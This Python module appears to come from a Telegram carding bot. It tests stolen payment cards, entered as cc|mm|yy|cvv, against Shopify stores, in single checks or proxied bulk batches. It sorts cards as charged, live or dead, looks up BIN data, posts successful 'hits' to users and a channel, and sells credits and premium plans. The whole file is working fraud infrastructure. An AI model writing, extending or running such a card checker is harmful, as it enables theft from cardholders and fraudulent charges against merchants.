# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _update_progress(bot, sid: str, force: bool = False):
    sess = MSH_SESSIONS.get(sid)
    if not sess:
        return
    now = time.time()
    if not force and (now - sess.get("last_update", 0) < 1.5):
        return

    text    = _progress_text(sess)
    running = sess["status"] == "CHECKING"

    if text == sess.get("last_text") and not force:
        return

    try:
        await bot.edit_message_text(
            chat_id=sess["chat_id"],
            message_id=sess["msg_id"],
            text=text,
            parse_mode="HTML",
            reply_markup=_msh_buttons(sid, running),
            disable_web_page_preview=True,
        )
        sess["last_text"]   = text
        sess["last_update"] = now
    except Exception:
        pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MSH — CORE WORKER BATCH
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def run_mass_batch(
    bot, sid: str, valid_cards: list,
    user, plan: str, all_sites: list, proxies: list,
):
    """
    Public so main.py's cmd_msh can call it directly.
    valid_cards: list of (card_str, cc_number)
    """
    sess = MSH_SESSIONS.get(sid)
    if not sess:
        return

    conn = aiohttp.TCPConnector(
        limit=MAX_CONCURRENT * 4, limit_per_host=MAX_CONCURRENT,
        keepalive_timeout=60, ssl=False, enable_cleanup_closed=True,
        ttl_dns_cache=600,
    )
    http_sess = aiohttp.ClientSession(
        connector=conn,
        headers={"User-Agent": "Mozilla/5.0 (BatChk/16)"},
        timeout=aiohttp.ClientTimeout(total=SITE_TIMEOUT + 5),
    )
    sess["_connector"] = conn
    sess["_session"]   = http_sess

    sem = asyncio.Semaphore(MAX_CONCURRENT)

    async def worker(card_fmt: str, cc_num: str):
        if sess.get("status") != "CHECKING":
            return
        async with sem:
            if sess.get("status") != "CHECKING":
                return
            t0 = time.time()
            try:
                verdict, raw, price, currency = await _check_card_with_retry(
                    http_sess, card_fmt, all_sites, proxies,
                    max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT, sid=sid,
                )
            except asyncio.CancelledError:
                return
            except Exception as e:
                verdict, raw, price, currency = "ERROR", str(e)[:60], "0.00", "USD"

            elapsed = time.time() - t0

            try:
                bin_data = await asyncio.wait_for(_bin_lookup(cc_num[:6]), timeout=5)
            except Exception:
                bin_data = {}

            rec = {
                "card": card_fmt, "verdict": verdict, "resp": raw,
                "price": price, "currency": currency, "bin_info": bin_data,
            }
            sess["checked"] += 1

            if verdict == "CHARGED":
                sess["charged"] += 1
                sess["charged_cards"].append(rec)
                msg = build_result_msg(card_fmt, raw, verdict, bin_data,
                                       price, currency, elapsed, user, plan)
                asyncio.create_task(_send_hit(
                    bot, sess["chat_id"], user, sess["user_msg_id"], msg, "CHARGED",
                ))
                asyncio.create_task(_update_progress(bot, sid, force=True))

            elif verdict in ("TDS", "LIVE"):
                sess["live"] += 1
                sess["live_cards"].append(rec)
                msg = build_result_msg(card_fmt, raw, verdict, bin_data,
                                       price, currency, elapsed, user, plan)
                asyncio.create_task(_send_hit(
                    bot, sess["chat_id"], user, sess["user_msg_id"], msg, "LIVE",
                ))
                asyncio.create_task(_update_progress(bot, sid, force=True))

            elif verdict == "DEAD":
                sess["dead"] += 1
                sess["dead_cards"].append(rec)

            else:
                sess["errors"] += 1
                sess["error_cards"].append(rec)

            checked = sess["checked"]
            if checked % PROGRESS_EVERY_N == 0 or checked >= sess["total"]:
                asyncio.create_task(_update_progress(bot, sid))

    tasks = []
    for card_fmt, cc_num in valid_cards:
        if sess.get("status") != "CHECKING":
            break
        tasks.append(asyncio.create_task(worker(card_fmt, cc_num)))
    sess["tasks"] = tasks

    await asyncio.gather(*tasks, return_exceptions=True)

    try:
        await http_sess.close()
        await conn.close()
    except Exception:
        pass

    if MSH_SESSIONS.get(sid, {}).get("status") == "CHECKING":
        MSH_SESSIONS[sid]["status"] = "FINISHED"

    await _update_progress(bot, sid, force=True)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /sh — SINGLE CARD COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    ud   = _get_ud(user.id, context)

    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
        await update.message.reply_text(
            "🔧 <b>Bot under maintenance. Please wait.</b>", parse_mode="HTML"
        )
        return

    if not context.bot_data.get("sh_on", True):
        await update.message.reply_text(
            "❌ <b>Single card check is currently disabled.</b>", parse_mode="HTML"
        )
        return

    # Parse card from args or replied message
    card = None
    if context.args:
        card = context.args[0].strip()
    elif update.message.reply_to_message:
        txt = (
            update.message.reply_to_message.text or
            update.message.reply_to_message.caption or ""
        ).strip()
        if txt:
            card = txt.split()[0]

    if not card or card.count("|") < 3:
        await update.message.reply_text(
            "ℹ️ <b>Usage:</b> <code>/sh cc|mm|yy|cvv</code>",
            parse_mode="HTML",
        )
        return

    parts = card.split("|")
    if len(parts) != 4:
        await update.message.reply_text(
            "❌ Invalid format. Use: <code>cc|mm|yy|cvv</code>",
            parse_mode="HTML",
        )
        return

    cc, mm, yy, cvv = parts
    if not luhn_check(cc):
        await update.message.reply_text(
            "❌ Card failed Luhn check.", parse_mode="HTML"
        )
        return
    if is_expired(mm, yy):
        await update.message.reply_text(
            "❌ Card is expired.", parse_mode="HTML"
        )
        return

    premium = _is_premium(ud, user.id)

    # Cooldown for non-premium users
    if not premium:
        if ud.get("credits", 0) <= 0:
            await update.message.reply_text(
                "❌ <b>No credits remaining.</b>\n\nUse /buy to get premium.",
                parse_mode="HTML",
            )
            return
        cd_map = context.bot_data.setdefault("sh_cd", {})
        rem    = SH_COOLDOWN - (time.time() - cd_map.get(user.id, 0))
        if rem > 0:
            await update.message.reply_text(
                f"⏳ <b>Cooldown:</b> wait <b>{int(rem)}s</b>",
                parse_mode="HTML",
            )
            return
        cd_map[user.id] = time.time()
        ud["credits"]   = max(0, ud.get("credits", 1) - 1)

    plan = ud.get("plan", "TRIAL")

    # Send spinner
    spin = await update.message.reply_text(
        f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
        f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Checking...</b>',
        parse_mode="HTML",
    )

    all_sites = _load_sites()
    proxies   = _load_proxies()
    t0        = time.time()

    try:
        sess = await _sh_session()
        (verdict, raw, price, currency), bin_data = await asyncio.gather(
            _check_card_with_retry(
                sess, card, all_sites, proxies,
                max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT,
            ),
            _bin_lookup(cc[:6]),
        )
    except Exception as e:
        verdict, raw, price, currency = "ERROR", str(e)[:60], "0.00", "USD"
        bin_data = {}

    elapsed = time.time() - t0
    text    = build_result_msg(
        card, raw, verdict, bin_data, price, currency, elapsed, user, plan,
    )

    # Build reply keyboard
    if verdict in ("CHARGED", "LIVE", "TDS"):
        kb = RawMarkup([[
            _btn(
                "💎 CHARGED" if verdict == "CHARGED" else "✅ LIVE",
                url=BOT_CHANNEL, style="primary",
                icon=BTN_CHARGED_EMOJI_ID if verdict == "CHARGED" else BTN_LIVE_EMOJI_ID,
            ),
        ]])
    else:
        kb = RawMarkup([[_btn("📢 Channel", url=BOT_CHANNEL)]])

    try:
        await spin.edit_text(text, parse_mode="HTML",
                             disable_web_page_preview=True, reply_markup=kb)
    except Exception:
        await update.message.reply_text(text, parse_mode="HTML",
                                        disable_web_page_preview=True, reply_markup=kb)

    # Fire hit notification for live/charged
    if verdict in ("CHARGED", "LIVE", "TDS"):
        asyncio.create_task(_send_hit(
            context.bot, update.message.chat_id, user,
            update.message.message_id, text, verdict,
        ))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK: download result file
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query  = update.callback_query
    parts  = query.data.split(":", 2)   # mshr:<sid>:<kind>
    if len(parts) < 3:
        await query.answer("❌ Invalid.", show_alert=True)
        return
    _, sid, kind = parts

    sess = MSH_SESSIONS.get(sid)
    if not sess:
        await query.answer("⚠️ Session expired.", show_alert=True)
        return
    if query.from_user.id != sess.get("user_id"):
        await query.answer("❌ Not your session.", show_alert=True)
        return
    if time.time() - sess["start_time"] < BUTTON_LOCK_SECS:
        rem = int(BUTTON_LOCK_SECS - (time.time() - sess["start_time"])) + 1
        await query.answer(f"⏳ Wait {rem}s", show_alert=True)
        return

    buf, fname, count = _make_result_file(sess, kind)
    if count == 0:
        await query.answer(f"❌ No {kind} cards yet.", show_alert=True)
        return

    await query.answer("📦 Sending file…")
    caption = (
        f"<b>Gate ➳ Shopify | 0-20$</b>\n"
        f"<b>Type ➳ {kind.capitalize()}</b>\n"
        f"<b>Total ➳ {count}</b>"
    )
    try:
        await context.bot.send_document(
            chat_id=query.message.chat_id,
            document=InputFile(buf, filename=fname),
            caption=caption,
            parse_mode="HTML",
            reply_to_message_id=sess.get("user_msg_id"),
        )
    except Exception as e:
        logging.error(f"[MSH] send_document error: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK: stop session
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cb_msh_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    parts = query.data.split(":", 1)    # mshs:<sid>
    if len(parts) < 2:
        await query.answer("❌ Invalid.", show_alert=True)
        return
    _, sid = parts

    sess = MSH_SESSIONS.get(sid)
    if not sess:
        await query.answer("⚠️ Session already finished.", show_alert=True)
        return
    if query.from_user.id != sess.get("user_id"):
        await query.answer("❌ Not your session.", show_alert=True)
        return
    if sess["status"] != "CHECKING":
        await query.answer("ℹ️ Not running.", show_alert=True)
        return

    sess["status"] = "STOPPED"
    for t in sess.get("tasks", []):
        if not t.done():
            t.cancel()

    conn = sess.get("_connector")
    if conn and not conn.closed:
        try:
            await conn.close()
        except Exception:
            pass

    await query.answer("🛑 Stopped.")
    sess["last_text"] = ""
    await _update_progress(context.bot, sid, force=True)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SESSION FACTORY  — called by main.py's cmd_msh to init a session
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def create_msh_session(
    sid: str, chat_id: int, user_id: int,
    msg_id: int, user_msg_id: int,
    total: int, user_obj, plan: str,
) -> dict:
    """
    Create and register a new mass-check session in MSH_SESSIONS.
    Returns the session dict.
    main.py's cmd_msh should call this, then asyncio.create_task(run_mass_batch(...)).
    """
    peid = _plan_eid(plan)
    sess = {
        "status":        "CHECKING",
        "chat_id":       chat_id,
        "user_id":       user_id,
        "msg_id":        msg_id,
        "user_msg_id":   user_msg_id,
        "total":         total,
        "checked":       0,
        "charged":       0,
        "live":          0,
        "dead":          0,
        "errors":        0,
        "start_time":    time.time(),
        "charged_cards": [],
        "live_cards":    [],
        "dead_cards":    [],
        "error_cards":   [],
        "tasks":         [],
        "last_text":     "",
        "last_update":   0,
        "user_obj":      user_obj,
        "plan":          plan,
        "plan_eid":      peid,
    }
    MSH_SESSIONS[sid] = sess
    return sess

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HANDLER EXPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def get_sh_handler() -> CommandHandler:
    """
    Returns a SINGLE CommandHandler for /sh.
    main.py calls:  app.add_handler(get_sh_handler())

    The /msh command is registered separately in main.py as:
      app.add_handler(CommandHandler("msh", cmd_msh))
    where main.py's cmd_msh uses _check_card_with_retry, SITE_RETRIES,
    SITE_TIMEOUT, MSH_SESSIONS, run_mass_batch, create_msh_session,
    cb_msh_result, cb_msh_stop imported from this module.
    """
    return CommandHandler("sh", cmd_sh)
